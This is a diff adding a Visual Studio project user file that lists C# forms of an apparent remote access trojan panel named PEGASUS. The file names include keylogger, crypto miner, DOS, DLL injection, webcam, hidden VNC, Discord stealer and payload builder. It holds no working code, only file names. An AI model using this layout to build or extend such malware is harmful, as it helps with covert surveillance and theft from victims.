@@ -1,0 +1,222 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <PropertyGroup />
+  <ItemGroup>
+    <Compile Update="custom_alert_notifications\alert.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="HVNC\AeroListView.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Update="HVNC\FrmAbout.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="HVNC\FrmBuilder.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="HVNC\FrmBuilderStatus.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="HVNC\FrmLogin.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="HVNC\FrmMassUpdate.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="HVNC\FrmRegister.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="HVNC\FrmTransfer.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="HVNC\FrmURL.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="InputDialog.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="LoyalListView.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Update="LoyalScrollBar.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Update="MsgBox.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\CPUClientSettings.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\CustomControls\TabControlEx.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\DLLInjectionPanel.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\FormAbout.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\FormAudio.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\FormBlockClients.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\FormBuilder.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\FormCertificate.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\FormChat.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\FormDOS.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\FormDownloadFile.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\FormFileManager.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\FormFileSearcher.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\FormFun.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\FormKeylogger.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\FormMiner.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\FormNetstat.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\FormPorts.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\FormPowerShell.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\FormProcessManager.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\FormRegistryEditor.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\FormRegValueEditBinary.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\FormRegValueEditMultiString.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\FormRegValueEditString.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\FormRegValueEditWord.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\FormRemoteDesktop.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\FormSetting.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\FormShell.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\FormWebcam.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\FrmAngry.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\FrmCSPM.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\FrmDiscordST3.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\FrmEmailer.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\FrmInfo.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\FrmNgrokPanel.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\FrmNoStub.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\FrmReco.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\FrmReverseProxy.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\FrmSkynet.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\FrmWebHookSPM.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\GPUClientSettings.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\Login.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\MsgBox.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\PEGASUS\PEGASUS_HVNC\FrmV.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\PEGASUS_M.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\PeToShell.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\Register.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\Splashes.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\Design\Welcome.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\FormSendFileToMemory.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\FrmSplash.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\IcarusWings\AeroListView.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\IcarusWings\HexEditor\HexEditor.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\IcarusWings\RegistryTreeView.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\IcarusWings\WordTextBox.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Update="PEGASUS\VNCForm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS_LIME\Design\MsgBox.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="PEGASUS_LIME\Design\PEGASUS.cs">
+      <SubType>Form</SubType>
+    </Compile>
+  </ItemGroup>
+</Project>
